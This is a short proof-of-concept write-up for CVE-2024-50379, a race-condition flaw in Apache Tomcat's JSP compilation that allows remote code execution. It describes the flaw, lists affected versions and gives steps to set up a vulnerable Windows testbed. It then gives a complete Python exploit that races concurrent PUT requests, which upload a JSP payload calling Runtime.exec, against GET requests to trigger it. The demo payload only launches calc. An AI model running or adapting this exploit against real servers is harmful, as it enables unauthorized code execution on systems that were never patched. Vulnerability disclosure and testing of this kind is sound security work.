                            ________________

                             CVE-2024-50379

                                Hexdump
                            ________________


Table of Contents
_________________

1. Description
2. PoC
3. References


1 Description
=============

  Time-of-check Time-of-use (TOCTOU) Race Condition vulnerability during
  JSP compilation in Apache Tomcat permits an RCE on case insensitive
  file systems when the default servlet is enabled for write
  (non-default configuration).

  CVE-2024-50379 part of a broader Apache Tomcat issue, CVE-2024-56337.

  The core of both CVEs lies in the same flaw: under certain
  configurations, concurrent file upload and read operations can bypass
  Tomcat's case sensitivity checks, enabling an attacker to upload a
  file that is mistakenly treated as executable code, leading to remote
  code execution (RCE).

  ----------------------------------------------------------------------

  Requirements:
  - Windows System
  - Config that enables PUT (readonly=false)

  Affected versions:
  - 11.0.0-M1 <= Apache Tomcat <= 11.0.1
  - 10.1.0-M1 <= Apache Tomcat <= 10.1.33
  - 9.0.0.M1 <= Apache Tomcat <= 9.0.97


2 PoC
=====

  Setup testbed by

  1. Downloading vulnerable version of tomcat and JDK>11

     ,----
     | https://archive.apache.org/dist/tomcat/tomcat-10/v10.1.30/bin/apache-tomcat-10.1.30-windows-x64.zip
     `----

  2. Configuring `readonly=false' in `web.xml'

     ,----
     | <init-param>
     |   <param-name>readonly</param-name>
     |   <param-value>false</param-value>
     | </init-param>
     `----

  3. Starting tomcat

     ,----
     | set JRE_HOME=C:\Program Files\Java\jdk-11
     | startup
     `----

  ----------------------------------------------------------------------

  ,----
  | import requests
  | from urllib.parse import urljoin
  | import concurrent.futures
  | 
  | target_url = "http://192.168.122.149:8080"
  | filename = "cve202450379"
  | target_url_put1 = f"{target_url}/{filename}.Jsp"
  | target_url_get1 = f"{target_url}/{filename}.jsp"
  | payload = "<%@ page import=\"java.io.*\" %><% Runtime.getRuntime().exec(\"cmd /c calc.exe\"); %>"
  | 
  | with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
  |     futures = []
  |     for _ in range(10):
  |         futures.append(executor.submit(requests.put, target_url_put1, headers={ "Content-Type": "application/json" }, data=payload))
  |         futures.append(executor.submit(requests.get, target_url_get1))            
  |     for future in concurrent.futures.as_completed(futures):
  |         try:
  |             response = future.result()
  |             if isinstance(response, requests.Response):
  |                 if (response.status_code == 200):
  |                     print(f"\033[31mFind: {target_url}: Apache Tomcat CVE-2024-50379 Conditional Competition To RCE!\033[0m")
  |         except Exception as e:
  |             pass
  `----


3 References
============

  - <https://nvd.nist.gov/vuln/detail/CVE-2024-50379>
  - <https://github.com/iSee857/CVE-2024-50379-PoC.git>
  - <https://vulcan.io/blog/how-to-fix-cve-2024-50379/>
